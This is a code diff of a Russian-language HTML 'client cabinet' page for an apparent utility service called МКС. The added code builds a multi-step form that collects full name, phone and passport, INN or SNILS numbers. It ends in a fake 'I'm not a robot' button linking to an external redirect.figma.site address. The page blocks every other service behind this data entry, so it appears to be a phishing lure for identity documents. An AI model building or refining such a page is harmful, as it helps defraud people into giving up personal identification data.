@@ -5,101 +5,227 @@
 <title>МКС — клиентский кабинет</title>
 <style>
   body { font-family: sans-serif; background:#f5f7fa; margin:0; padding:20px; }
-  .menu, .submenu { display: grid; gap: 10px; max-width: 400px; margin: 20px auto; }
+  h2 { text-align:center; }
+  .menu, .submenu { display:grid; gap:10px; max-width:400px; margin:20px auto; }
   button {
-    padding: 12px; border: none; border-radius: 8px;
-    background: #0066ff; color:white; font-size: 15px;
-    cursor: pointer;
+    padding:12px; border:none; border-radius:8px;
+    background:#0066ff; color:white; font-size:15px;
+    cursor:pointer;
   }
   button:hover { background:#004ecc; }
-  .hidden { display: none; }
-  .card {
-    background:white; border-radius:12px; padding:20px;
-    box-shadow:0 4px 20px rgba(0,0,0,.1);
-    margin-top:20px;
+  .card { display:none; background:white; border-radius:12px;
+    padding:20px; max-width:480px; margin:20px auto;
+    box-shadow:0 4px 20px rgba(0,0,0,.1); }
+  .active { display:block; }
+  input, select {
+    width:100%; padding:10px; margin:8px 0;
+    border:1px solid #ccc; border-radius:6px;
   }
+  .error { color:red; margin-top:8px; font-size:14px; }
 </style>
 <script>
+let step = 0;
+let docType = "";
+
 function show(id) {
-  document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
-  document.getElementById(id).classList.remove('hidden');
+  document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+  if (id) document.getElementById(id).classList.add('active');
+}
+
+function startUpdate() {
+  step = 1;
+  show('step1');
+}
+
+// ======== Валидации =========
+function validateStep1() {
+  const fio = document.getElementById('fio').value.trim();
+  const error = document.getElementById('err1');
+  if (!/^[А-Яа-яЁё\s-]+$/.test(fio)) {
+    error.textContent = "❌ ФИО должно содержать только буквы кириллицы.";
+    return;
+  }
+  error.textContent = "";
+  step = 2; show('step2');
+}
+
+function validateStep2() {
+  const phone = document.getElementById('phone').value.trim();
+  const error = document.getElementById('err2');
+  const digits = phone.replace(/\D/g,"");
+  if (!(phone.startsWith("+7") || phone.startsWith("7"))) {
+    error.textContent = "❌ Номер должен начинаться с +7 или 7.";
+    return;
+  }
+  if (digits.length < 10 || digits.length > 11) {
+    error.textContent = "❌ Номер должен содержать 10–11 цифр.";
+    return;
+  }
+  error.textContent = "";
+  step = 3; show('step3');
+}
+
+function validateStep3() {
+  docType = document.getElementById('doc').value;
+  if (!docType) return;
+  step = 4; show('step4');
+  document.getElementById('docLabel').textContent = "Введите номер (" + docType + ")";
+}
+
+function validateStep4() {
+  const num = document.getElementById('docnum').value.trim();
+  const error = document.getElementById('err4');
+  let ok = false;
+  if (docType.includes("Паспорт")) ok = /^\d{4}\s\d{6}$/.test(num);
+  if (docType.includes("ИНН")) ok = /^\d{10,12}$/.test(num);
+  if (docType.includes("СНИЛС")) ok = /^\d{3}-\d{3}-\d{3}\s\d{2}$/.test(num);
+  if (!ok) {
+    error.textContent = "❌ Формат номера для " + docType + " неверный.";
+    return;
+  }
+  error.textContent = "";
+  step = 5; show('step5');
+}
+
+function resetForm() {
+  step = 0;
+  show(null);
 }
 </script>
 </head>
 <body>
 
-<h2 style="text-align:center;">🏠 Добро пожаловать в МКС</h2>
+<h2>🏠 Добро пожаловать в МКС</h2>
 
 <div class="menu">
-  <button onclick="show('update')">📝 Обновить данные</button>
+  <button onclick="startUpdate()">📝 Обновить данные</button>
   <button onclick="show('tariff')">🔄 Поменять тариф</button>
   <button onclick="show('balance')">💳 Проверить баланс</button>
   <button onclick="show('refill')">💸 Пополнить баланс</button>
   <button onclick="show('services')">🛠️ Дополнительные услуги</button>
+  <button onclick="show('auth')">🔐 Авторизоваться</button>
+  <button onclick="show('change')">↩️ Сменить действие</button>
 </div>
 
-<div id="update" class="card hidden">
-  <h3>Обновить данные</h3>
-  <form>
-    <label>ФИО<br><input type="text" name="fio"></label><br><br>
-    <label>Телефон<br><input type="tel" name="phone" placeholder="+7..."></label><br><br>
-    <label>Email<br><input type="email" name="email"></label><br><br>
-    <button type="submit">Отправить</button>
-  </form>
-  <button onclick="show(null)">↩️ Вернуться назад</button>
+<!-- ФИО -->
+<div id="step1" class="card">
+  <h3>👤 Укажите ФИО</h3>
+  <input id="fio" type="text" placeholder="Фамилия Имя Отчество">
+  <div id="err1" class="error"></div>
+  <button onclick="validateStep1()">Далее</button>
+  <button onclick="resetForm()">↩️ Вернуться назад</button>
 </div>
 
-<div id="tariff" class="card hidden">
-  <h3>Поменять тариф</h3>
-  <p>Мы не можем поменять тариф без авторизации.</p>
-  <button onclick="show(null)">↩️ Вернуться назад</button>
+<!-- Телефон -->
+<div id="step2" class="card">
+  <h3>📞 Укажите телефон</h3>
+  <input id="phone" type="tel" placeholder="+79991234567">
+  <div id="err2" class="error"></div>
+  <button onclick="validateStep2()">Далее</button>
+  <button onclick="show('step1')">↩️ Вернуться назад</button>
 </div>
 
-<div id="balance" class="card hidden">
-  <h3>Проверить баланс</h3>
-  <p>Мы не можем проверить баланс без авторизации.</p>
-  <button onclick="show(null)">↩️ Вернуться назад</button>
+<!-- Выбор документа -->
+<div id="step3" class="card">
+  <h3>Выберите документ</h3>
+  <select id="doc">
+    <option value="">-- выберите --</option>
+    <option>📄 Паспорт</option>
+    <option>🧾 ИНН</option>
+    <option>🟢 СНИЛС</option>
+  </select>
+  <button onclick="validateStep3()">Далее</button>
+  <button onclick="show('step2')">↩️ Вернуться назад</button>
 </div>
 
-<div id="refill" class="card hidden">
-  <h3>Пополнить баланс</h3>
-  <p>Мы не можем пополнить без авторизации.</p>
-  <button onclick="show(null)">↩️ Вернуться назад</button>
+<!-- Номер документа -->
+<div id="step4" class="card">
+  <h3 id="docLabel">Введите номер документа</h3>
+  <input id="docnum" type="text" placeholder="">
+  <div id="err4" class="error"></div>
+  <button onclick="validateStep4()">Далее</button>
+  <button onclick="show('step3')">↩️ Вернуться назад</button>
 </div>
 
-<div id="services" class="card hidden">
-  <h3>Дополнительные услуги</h3>
+<!-- Финал -->
+<div id="step5" class="card">
+  <h3>❗ Последний шаг ❗</h3>
+  <p>Подтвердите, что вы человек:</p>
+  <a href="https://redirect.figma.site/"><button type="button">Я не робот ✅</button></a><br><br>
+  <button onclick="resetForm()">↩️ Вернуться в меню</button>
+</div>
+
+<!-- Остальные разделы -->
+<div id="tariff" class="card">
+  <h3>🔄 Поменять тариф</h3>
+  <p>Мы не можем поменять из-за того, что вы не авторизовались. ⚠️</p>
+  <button onclick="resetForm()">↩️ Вернуться назад</button>
+</div>
+
+<div id="balance" class="card">
+  <h3>💳 Проверить баланс</h3>
+  <p>Мы не можем проверить из-за того, что вы не авторизовались. ⚠️</p>
+  <button onclick="resetForm()">↩️ Вернуться назад</button>
+</div>
+
+<div id="refill" class="card">
+  <h3>💸 Пополнить баланс</h3>
+  <p>Мы не можем пополнить из-за того, что вы не авторизовались. ⚠️</p>
+  <button onclick="resetForm()">↩️ Вернуться назад</button>
+</div>
+
+<div id="services" class="card">
+  <h3>🛠️ Дополнительные услуги</h3>
   <div class="submenu">
-    <button onclick="show('faq')">❓ Часто задаваемые вопросы</button>
+    <button onclick="show('faq')">❓ FAQ</button>
     <button onclick="show('instruction')">ℹ️ Инструкция</button>
-    <button onclick="show('support')">📞 Связаться с техподдержкой</button>
-    <button onclick="show(null)">↩️ Вернуться назад</button>
+    <button onclick="show('support')">📞 Поддержка</button>
+    <button onclick="resetForm()">↩️ Вернуться назад</button>
   </div>
 </div>
 
-<div id="faq" class="card hidden">
-  <h3>Часто задаваемые вопросы</h3>
+<div id="faq" class="card">
+  <h3>❓ Часто задаваемые вопросы</h3>
   <ul>
-    <li>До какого числа нужно передавать показания? — До 25 числа.</li>
-    <li>Что будет, если не передать данные вовремя? — Плата начислится по среднему.</li>
-    <li>Это безопасно? — Да, данные защищены.</li>
-    <li>Почему через веб? — Для удобства.</li>
+    <li>⏳ До какого числа нужно передавать показания? — До 25 числа каждого месяца.</li>
+    <li>💸 Что будет, если не передать данные вовремя? — Плата будет начислена по среднему.</li>
+    <li>🔒 Это безопасно? — Да, используется защита и шифрование.</li>
+    <li>⚡ Почему через Telegram? — Для удобства.</li>
+    <li>🔁 Можно ли исправить ошибку? — Да, можно.</li>
+    <li>📑 Какие документы можно использовать? — Паспорт, ИНН, СНИЛС.</li>
   </ul>
   <button onclick="show('services')">↩️ Вернуться назад</button>
 </div>
 
-<div id="instruction" class="card hidden">
-  <h3>Инструкция</h3>
-  <p>1. Нажмите «Обновить данные»<br>
-     2. Заполните форму<br>
-     3. Получите подтверждение</p>
+<div id="instruction" class="card">
+  <h3>ℹ️ Инструкция</h3>
+  <p>
+    1️⃣ Нажмите «Обновить данные».<br>
+    2️⃣ Введите ФИО и телефон.<br>
+    3️⃣ Выберите документ и введите его номер.<br>
+    4️⃣ Подтвердите действие.<br><br>
+    На любом этапе можно нажать «↩️ Вернуться назад».
+  </p>
   <button onclick="show('services')">↩️ Вернуться назад</button>
 </div>
 
-<div id="support" class="card hidden">
-  <h3>Техподдержка</h3>
-  <p>📞 Напишите нам в <a href="#">Telegram</a></p>
+<div id="support" class="card">
+  <h3>📞 Техподдержка</h3>
+  <p><a href="https://t.me/MyMKCsup">📞 Написать в техподдержку</a></p>
   <button onclick="show('services')">↩️ Вернуться назад</button>
+</div>
+
+<div id="auth" class="card">
+  <h3>🔐 Авторизация</h3>
+  <p>Для авторизации начните с «Обновить данные».</p>
+  <button onclick="startUpdate()">📝 Обновить данные</button>
+  <button onclick="resetForm()">↩️ Вернуться назад</button>
+</div>
+
+<div id="change" class="card">
+  <h3>↩️ Сменить действие</h3>
+  <p>🏠 Главное меню</p>
+  <button onclick="resetForm()">ОК</button>
 </div>
 
 </body>
